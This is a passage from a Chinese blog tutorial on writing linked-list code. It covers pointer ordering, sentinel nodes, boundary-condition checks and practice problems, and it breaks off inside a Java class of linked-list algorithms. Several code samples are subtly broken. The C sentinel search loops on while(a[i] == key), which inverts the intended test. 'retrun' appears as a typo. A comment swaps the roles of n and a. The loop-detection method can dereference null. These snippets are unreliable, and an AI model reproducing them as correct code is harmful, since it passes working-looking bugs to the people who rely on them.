class=\"comment\">//将c结点next指针指向b结点</span></span><br></pre></td></tr></table></figure>\n<p>当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。</p>\n<p>对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。</p>\n<h3 id=\"利用哨兵简化实现难度\"><a href=\"#利用哨兵简化实现难度\" class=\"headerlink\" title=\"利用哨兵简化实现难度\"></a>利用哨兵简化实现难度</h3><p>首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_node-&gt;next = p-&gt;next; </span><br><span class=\"line\">p-&gt;next = new_node;</span><br></pre></td></tr></table></figure>\n<p>但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = new_node;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = p-&gt;next-&gt;next；</span><br></pre></td></tr></table></figure>\n<p>但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head-&gt;next == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，<strong>针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理</strong>。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？</p>\n<p>这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。</p>\n<p>还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。</p>\n<p>如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做<strong>带头链表</strong>，相反，没有哨兵结点的链表叫做<strong>不带头链表</strong>。</p>\n<p>如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/带头链表.jpg\">\n<p>实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。</p>\n<p>代码一：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里有两个比较操作： i&lt;n 和 a[i] == key</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;n)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t\tretrun i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tretrun <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码二：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"comment\">// 为了更好的解释，这里举了个例子来说明</span></span><br><span class=\"line\"><span class=\"comment\">// a = &#123;4,2,3,5,9,6&#125; key = 7</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[n<span class=\"number\">-1</span>] == key)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> temp = a[n<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125;</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = key;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 此时while循环比起代码一，少了i&lt;n这个比较操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 将数组a[n-1] 恢复为原来的值</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = temp;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 如果i = n-1，说明数组中没有要找的key</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(i == n<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 否则，说明找到了key，位置为i</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。</p>\n<p>当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。</p>\n<h3 id=\"重点留意边界条件处理\"><a href=\"#重点留意边界条件处理\" class=\"headerlink\" title=\"重点留意边界条件处理\"></a>重点留意边界条件处理</h3><p>软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。</p>\n<p>我经常用来检查链表代码是否正确执行的边界条件有这么几个：</p>\n<ul>\n<li>如果链表为空时，代码是否能正常工作？</li>\n<li>如果一个链表只包含了一个结点，代码能否正常工作？</li>\n<li>如果链表只包含两个结点时，代码能否正常工作？</li>\n<li>代码逻辑在处理头结点和尾结点时，是否能正常工作？</li>\n</ul>\n<p>当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。</p>\n<p>当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。</p>\n<p>其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。</p>\n<h3 id=\"举列画图，辅助思考\"><a href=\"#举列画图，辅助思考\" class=\"headerlink\" title=\"举列画图，辅助思考\"></a>举列画图，辅助思考</h3><p>对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。</p>\n<p>你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/举例.jpg\">\n<p>看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。</p>\n<h3 id=\"多写多练，没有捷径\"><a href=\"#多写多练，没有捷径\" class=\"headerlink\" title=\"多写多练，没有捷径\"></a>多写多练，没有捷径</h3><p>如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。</p>\n<p>下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。</p>\n<ul>\n<li>单链表反转</li>\n<li>链表中环的检测</li>\n<li>两个有序链表合并</li>\n<li>删除链表倒数第n个结点</li>\n<li>求链表的中间结点</li>\n</ul>\n<p>我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 链表的一些算法题目</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LinkListAlgorithm</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第一个链表，检测是否有环</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表中环的检测\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n1 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n2 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n3 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">3</span>);</span><br><span class=\"line\">        n1.next = n2;</span><br><span class=\"line\">        n2.next = n3;</span><br><span class=\"line\">        n3.next = n1; <span class=\"comment\">// 1-&gt;2-&gt;3-&gt;1</span></span><br><span class=\"line\">        System.out.println(isLoop(n1)); <span class=\"comment\">// true</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 链表反转</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表反转\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n4 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">4</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n5 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">5</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n6 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">6</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n7 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">7</span>);</span><br><span class=\"line\">        n4.next = n5;</span><br><span class=\"line\">        n5.next = n6;</span><br><span class=\"line\">        n6.next = n7;</span><br><span class=\"line\">        System.out.println(printLinkList(n4)); <span class=\"comment\">// 4-&gt;5-&gt;6-&gt;7</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head = reverse(n4);</span><br><span class=\"line\">        System.out.println(printLinkList(head)); <span class=\"comment\">// 7-&gt;6-&gt;5-&gt;4</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 求链表的中间节点</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"求链表的中间节点\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n8 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">8</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n9 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">9</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n10 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n11 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">11</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n12 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">12</span>);</span><br><span class=\"line\">        n8.next = n9;</span><br><span class=\"line\">        n9.next = n10;</span><br><span class=\"line\">        n10.next = n11;</span><br><span class=\"line\">        n11.next = n12; <span class=\"comment\">// 8-&gt;9-&gt;10-&gt;11-&gt;12</span></span><br><span class=\"line\">        System.out.println(printLinkList(n8));</span><br><span class=\"line\">        Node&lt;Integer&gt; mid = middle(n8);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"中间节点是： \"</span> + mid.val);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 有序链表合并</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"有序链表合并\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n13 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">13</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n14 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">14</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n15 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">15</span>);</span><br><span class=\"line\">        n13.next = n14;</span><br><span class=\"line\">        n14.next = n15;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第一个链表： \"</span>+printLinkList(n8));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第二个链表： \"</span>+printLinkList(n13));</span><br><span class=\"line\">        head = merge(n8, n13);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"合并后的链表： \"</span>+printLinkList(head));</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 删除倒数第2个节点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; n16 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">16</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n17 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">17</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n18 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">18</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n19 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">19</span>);</span><br><span class=\"line\">        n16.next = n17;</span><br><span class=\"line\">        n17.next = n18;</span><br><span class=\"line\">        n18.next = n19;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除前： \"</span>+printLinkList(n16));</span><br><span class=\"line\">        head = deleteLastKDesc(n16, <span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除后： \"</span>+printLinkList(n16));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 合并两个有序链表 */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">merge</span><span class=\"params\">(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 确定新链表头结点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head, p = n1, q = n2;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.val &gt; q.val)&#123;</span><br><span class=\"line\">            head = n2;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            head = n1;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;Integer&gt; r = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p!=<span class=\"keyword\">null</span> &amp;&amp;q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p.val &lt; q.val)&#123;</span><br><span class=\"line\">                r.next = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                r.next = q;</span><br><span class=\"line\">                q = q.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            r = r.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r.next = p;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            r.next = q;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**查找链表中间节点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">middle</span><span class=\"params\">(Node&lt;Integer&gt; head)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head==<span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q.next !=<span class=\"keyword\">null</span> &amp;&amp; q.next.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 链表中环的检测*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isLoop</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 采用快慢指针法 如果两个指针相遇，则说明有环</span></span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q == p)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**反转链表*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">reverse</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)<span class=\"keyword\">return</span> head;</span><br><span class=\"line\">        Node&lt;Integer&gt; p;</span><br><span class=\"line\">        Node&lt;Integer&gt; q;</span><br><span class=\"line\">        Node&lt;Integer&gt; r;</span><br><span class=\"line\">        p = head;</span><br><span class=\"line\">        q = p.next;</span><br><span class=\"line\">        